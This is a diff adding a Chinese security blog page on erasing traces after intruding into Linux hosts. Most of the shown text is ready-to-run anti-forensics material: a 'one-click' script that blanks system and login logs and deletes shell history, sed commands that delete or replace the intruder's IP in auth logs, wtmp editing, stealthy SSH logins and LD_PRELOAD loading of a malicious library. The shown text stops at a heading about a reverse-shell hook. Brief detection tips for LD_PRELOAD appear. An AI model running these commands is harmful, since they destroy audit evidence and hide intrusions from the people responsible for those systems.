@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Linux痕迹擦除 | 欢迎来到closeto的博客</title>
+  <meta name="keywords" content=" 2022 , 内网 , 渗透测试 , Linux ">
+  <meta name="description" content="Linux痕迹擦除 | 欢迎来到closeto的博客">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="0x00-初识​		👆 本小节仅了解PE文件是什么、有什么作用、有哪些重要的结构体，结构体字段可否修改和作用。详细结构体介绍以及其它操作在本系列文章后续。👆 ​		PE (Portable Executable) 文件格式是Windows操作系统上的标准可执行文件格式，通俗易懂将就是.sys（驱动程序）、.lib（静态链接库）、.DLL（动态链接库）、.exe（可执行程序）等。PE文件格式在W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PE文件格式—简介">
+<meta property="og:url" content="https://closeto.github.io/2022/04/10/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E2%80%94%E7%AE%80%E4%BB%8B/index.html">
+<meta property="og:site_name" content="欢迎来到closeto的博客">
+<meta property="og:description" content="0x00-初识​		👆 本小节仅了解PE文件是什么、有什么作用、有哪些重要的结构体，结构体字段可否修改和作用。详细结构体介绍以及其它操作在本系列文章后续。👆 ​		PE (Portable Executable) 文件格式是Windows操作系统上的标准可执行文件格式，通俗易懂将就是.sys（驱动程序）、.lib（静态链接库）、.DLL（动态链接库）、.exe（可执行程序）等。PE文件格式在W">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://closeto.github.io/images/PE01.jpg">
+<meta property="og:image" content="https://closeto.github.io/images/PE02.jpg">
+<meta property="og:image" content="https://closeto.github.io/images/PE03.jpg">
+<meta property="og:image" content="https://closeto.github.io/images/PE04.jpg">
+<meta property="og:image" content="https://closeto.github.io/images/PE05.jpg">
+<meta property="og:image" content="https://closeto.github.io/images/PE06.png">
+<meta property="article:published_time" content="2022-04-10T02:48:36.000Z">
+<meta property="article:author" content="closeto">
+<meta property="article:tag" content="2022">
+<meta property="article:tag" content="文件格式">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://closeto.github.io/images/PE01.jpg">
+
+
+<link rel="icon" href="/img/ico.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/user.png"/>
+</a>
+<div class="author">
+    <span>closeto</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/closeto"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:vou0515@gmail.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(7)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="内网安全">
+            
+            内网安全
+            <small>(2)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="Windows相关">
+            
+            Windows相关
+            <small>(4)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="考证学习">
+            
+            考证学习
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+    </div>
+    <div>
+        
+            <a class="about  "
+               target="_blank"
+                    
+               href="https://github.com/closeto">关于</a>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="7">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/url">名字列表</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>2022</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>2023</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内网</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>软考</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>渗透测试</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件格式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>中级</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Bin</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ShellCode</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Windows</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/04/10/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E2%80%94%E7%AE%80%E4%BB%8B/"
+           data-tag="2022,文件格式"
+           data-author="" >
+            <span class="post-title" title="PE文件格式—简介">PE文件格式—简介</span>
+            <span class="post-date" title="2022-04-10 10:48:36">2022/04/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/19/Linux%E7%97%95%E8%BF%B9%E6%93%A6%E9%99%A4/"
+           data-tag="2022,内网,渗透测试,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux痕迹擦除">Linux痕迹擦除</span>
+            <span class="post-date" title="2022-02-19 00:00:00">2022/02/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 内网安全 "
+           href="/2022/02/18/Windows%E7%97%95%E8%BF%B9%E6%93%A6%E9%99%A4/"
+           data-tag="2022,内网,渗透测试,Windows"
+           data-author="" >
+            <span class="post-title" title="Windows痕迹擦除">Windows痕迹擦除</span>
+            <span class="post-date" title="2022-02-18 00:00:00">2022/02/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/01/18/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E5%BC%83/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相弃">ShellCode入门到放弃—相弃</span>
+            <span class="post-date" title="2022-01-18 17:30:00">2022/01/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 考证学习 "
+           href="/2022/01/18/%E8%BD%AF%E8%80%83%E4%B8%AD%E7%BA%A7%E2%80%94%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"
+           data-tag="2023,软考,中级"
+           data-author="" >
+            <span class="post-title" title="软考中级—信息安全工程师">软考中级—信息安全工程师</span>
+            <span class="post-date" title="2022-01-18 14:30:00">2022/01/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/01/15/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E7%9F%A5/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相知">ShellCode入门到放弃—相知</span>
+            <span class="post-date" title="2022-01-15 12:12:12">2022/01/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 Windows相关 "
+           href="/2022/01/10/ShellCode%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E2%80%94%E7%9B%B8%E9%81%87/"
+           data-tag="2022,ShellCode,Bin"
+           data-author="" >
+            <span class="post-title" title="ShellCode入门到放弃—相遇">ShellCode入门到放弃—相遇</span>
+            <span class="post-date" title="2022-01-10 09:30:00">2022/01/10</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Linux痕迹擦除" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Linux痕迹擦除</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="内网安全">内网安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">2022</a>
+            
+            <a class="color3">内网</a>
+            
+            <a class="color5">渗透测试</a>
+            
+            <a class="color1">Linux</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        <!-- 修改了原始显示，原始显示更新日期为悬浮 -->
+        <!-- 
+            发布时间 : <time class="date" title='最后更新: 2023-08-22 17:07:44'>2022-02-19 00:00</time>
+         -->
+
+        
+            发布时间 : 2022-02-19 00:00</time>
+        <br>
+
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E7%97%95%E8%BF%B9%E6%93%A6%E9%99%A4"><span class="toc-text">Linux痕迹擦除</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#History%E8%AE%B0%E5%BD%95"><span class="toc-text">History记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">Linux日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95"><span class="toc-text">隐藏登录记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81"><span class="toc-text">库文件劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD%E5%8A%AB%E6%8C%81"><span class="toc-text">LD_PRELOAD劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-ld-so-preload%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8FSO"><span class="toc-text">&#x2F;etc&#x2F;ld.so.preload加载恶意SO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#patchelf%E6%B3%A8%E5%85%A5"><span class="toc-text">patchelf注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BC%AA%E8%A3%85"><span class="toc-text">文件伪装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="toc-text">文件隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%A6%E9%99%A4"><span class="toc-text">文件擦除</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%A3%80%E6%9F%A5%E7%82%B9-%E5%AF%B9%E6%8A%97"><span class="toc-text">Linux检查点(对抗)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BB%88%E7%AB%AF"><span class="toc-text">获取交互式终端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83%EF%BC%88%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%89"><span class="toc-text">SUID提权（关键字）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BF%A1%E6%81%AF"><span class="toc-text">端口转发信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B"><span class="toc-text">查找隐藏进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81-1"><span class="toc-text">库文件劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8E%92%E6%9F%A5"><span class="toc-text">启动项排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%9F%A5%E6%89%BE"><span class="toc-text">后门查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-text">登录信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%88%86%E7%A0%B4%E4%BF%A1%E6%81%AF"><span class="toc-text">ssh爆破信息</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Linux痕迹擦除"><a href="#Linux痕迹擦除" class="headerlink" title="Linux痕迹擦除"></a>Linux痕迹擦除</h1><p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">date -s &quot;3019-08-07 09:06:23&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/auth.log</span><br><span class="line">sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/secure</span><br><span class="line">sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/messages</span><br><span class="line">#!/usr/bin/bash</span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="History记录"><a href="#History记录" class="headerlink" title="History记录"></a>History记录</h2><p>History记录原理：当前shell执行的命令记录放置在缓存中，<code>history</code>命令查看的也是缓存中的命令，当exit退出时系统会将缓存的命令写入history文件<code>~/.bash_history</code>。如果在shell运行过程中kill掉其进程，则缓存命令不会写入history。</p>
+<p><strong>部分清除</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set +o history		关闭history记录</span><br><span class="line">set -o history		开启history记录</span><br><span class="line">history -c			清除当前Session缓存的命令记录</span><br><span class="line"></span><br><span class="line">清除当前session的记录</span><br><span class="line">	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTLOG</span><br><span class="line"></span><br><span class="line">修改bash的history信息</span><br><span class="line">vi .bash_history</span><br><span class="line"></span><br><span class="line">history -c			缓存的历史记录不存在</span><br><span class="line">rm .bash_history	仅清除存储的历史记录，不会删除缓存</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>全部清除</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将缓存的history记录和~/.bash_history中的记录全部清空</span><br><span class="line">	HISTSIZE=0 &amp;&amp; HISTFILESIZE=0</span><br><span class="line">	</span><br><span class="line">~/.bashrc初始化文件中添加命令：</span><br><span class="line">	HISTSIZE=0 &amp;&amp; HISTFILESIZE=0</span><br></pre></td></tr></table></figure>
+
+<p><strong>账户退出自动清除</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/skel/.bash_logout</span><br><span class="line">#新增如下：</span><br><span class="line">rm -f $HOME/.bash_hsitory </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Linux日志文件"><a href="#Linux日志文件" class="headerlink" title="Linux日志文件"></a>Linux日志文件</h2><table>
+<thead>
+<tr>
+<th>&#x2F;var&#x2F;log&#x2F;btmp</th>
+<th>记录所有用户错误登录信息，二进制文件， 使用lastb命令查看</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td>记录所有用户成功登录、注销信息，二进制文件，使用last命令查看</td>
+</tr>
+<tr>
+<td>&#x2F;run&#x2F;utmp</td>
+<td>记录当前已经登录的用户信息，二进制文件，使用w、who、users等命令查看</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;secure 或 &#x2F;var&#x2F;log&#x2F;auth.log</td>
+<td>记录与安全相关的日志信息，涉及使用账户和密码登录的程序都会记录</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td>记录所有用户最后一次的登录时间的曰志，二进制文件，使用lastlog命令查看</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;messages</td>
+<td>记录系统启动后的信息和错误日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cron</td>
+<td>记录定时任务相关的日志信息</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;boot.log</td>
+<td>记录守护进程启动和停止相关的日志消息</td>
+</tr>
+</tbody></table>
+<p>PS：Linux中绝大多数应用日志默认路径都在<code>/var/log/</code>目录下，比如：<code>/var/log/apache2/access.log</code>、<code>/var/log/nginx/access.log</code>，root权限直接可以查看并删改，<strong>而且不需要停止当前应用运行的服务</strong></p>
+<p><strong>清空日志文件（全部删除）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line">echo &quot;&quot; &gt; filename</span><br><span class="line">echo &gt; filename</span><br></pre></td></tr></table></figure>
+
+<p><strong>清空日志文件（部分删除）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 删除所有匹配到字符串的行，比如自己的登录ip</span><br><span class="line">sed -i &#x27;/ip/&#x27;d /var/log/messages</span><br><span class="line"></span><br><span class="line"># 全局替换登录IP地址：</span><br><span class="line">sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/auth.log</span><br><span class="line">sed -i &#x27;s/ip1/ip2/g&#x27; /var/log/secure</span><br><span class="line"></span><br><span class="line">#删除当天日志</span><br><span class="line">sed  -i &#x27;/当天日期/&#x27;d  filename</span><br><span class="line"></span><br><span class="line">======================================================</span><br><span class="line"># 将二进制日志文件转换为可编辑的文本文件</span><br><span class="line">utmpdump /var/log/wtmp &gt;/var/log/wtmp.file</span><br><span class="line"></span><br><span class="line"># 对文本文件进行编辑和修改</span><br><span class="line"># 将编辑修改后的文本文件转换为二进制日志文件</span><br><span class="line">utmpdump -r &lt; /var/log/wtmp.file &gt; /var/log/wtmp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>一键清除脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/bash</span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
+
+<h2 id="隐藏登录记录"><a href="#隐藏登录记录" class="headerlink" title="隐藏登录记录"></a>隐藏登录记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[推]ssh -T root@192.168.64.130 /usr/bin/bash</span><br><span class="line">ssh -T root@192.168.64.130 /bin/bash –i</span><br><span class="line"># -T：不分配伪终端</span><br><span class="line">注意：</span><br><span class="line">	★不会显示登录终端，但有登录日志记录</span><br><span class="line">	★ps -ef 会显示“ root@notty ”伴随着/usr/bin/bash字样的进程信息</span><br><span class="line"></span><br><span class="line">登录时不将ssh公钥保存在本地.ssh目录中：</span><br><span class="line">[推]ssh -o UserKnownHostsFile=/dev/null -T root@192.168.126.2 /usr/bin/bash</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.126.2 /bin/bash –i</span><br><span class="line"># -o：options选择信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="库文件劫持"><a href="#库文件劫持" class="headerlink" title="库文件劫持"></a>库文件劫持</h2><p>可以实现进程隐藏<br>无法使用netstat、cat、top等命令查看网络连接的情况，被植入rootkit<br>劫持库(.so)文件，三种方式（仅笔记记录未深入学习）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、更改LD_PRELOAD环境变量，加载恶意库文件</span><br><span class="line"></span><br><span class="line">2、/etc/ld.so.preload加载恶意的库文件(主流的劫持技术)</span><br><span class="line"></span><br><span class="line">3、更改默认的库文件/etc/ld.so.preload为其他库文件</span><br><span class="line"></span><br><span class="line">4、patchelf将so文件注入到/bin/xxx的命令中</span><br></pre></td></tr></table></figure>
+
+<h3 id="LD-PRELOAD劫持"><a href="#LD-PRELOAD劫持" class="headerlink" title="LD_PRELOAD劫持"></a>LD_PRELOAD劫持</h3><p><strong>安装</strong></p>
+<p>LD_PRELOAD环境变量是会及时生效的，使用LD_PRELOAD加载恶意动态链接库方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># LD_PRELOAD的值设置为要预加载的动态链接库</span><br><span class="line">LD_PRELOAD=/lib/evil.so </span><br><span class="line"></span><br><span class="line"># 导出环境变量使该环境变量生效</span><br><span class="line">export LD_PRELOAD </span><br><span class="line"></span><br><span class="line"># 解除设置的LD_PRELOAD环境变量</span><br><span class="line">unset LD_PRELOAD </span><br></pre></td></tr></table></figure>
+
+<p><strong>检测</strong></p>
+<p>1、直接打印出LD_PRELOAD的值(默认LD_PRELOAD环境变量无值)，如果LD_PRELOAD中有值，则将该文件上传到virustotal或微步在线等恶意软件检测平台检测该文件是否正常</p>
+<p>2、用自制的特征进行匹配或者人工strings或者用ida看一下，即可判断出是否是恶意程序。</p>
+<p><strong>清除</strong></p>
+<p>使用命令unset LD_PRELOAD即可实现卸载使用LD_PRELOAD环境变量安装的恶意动态链接库</p>
+<p><strong>【实践】</strong></p>
+<p>查看命令使用了哪些函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /bin/xxx</span><br><span class="line"></span><br><span class="line">以ls命令为例，vi也是用了strcnmp</span><br><span class="line">readelf -Ws /bin/ls</span><br></pre></td></tr></table></figure>
+
+<p>查看命令调用了哪些库文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -e trace=file /bin/xxx</span><br></pre></td></tr></table></figure>
+
+<p>①编写hook.c文件内容，反弹shell</p>
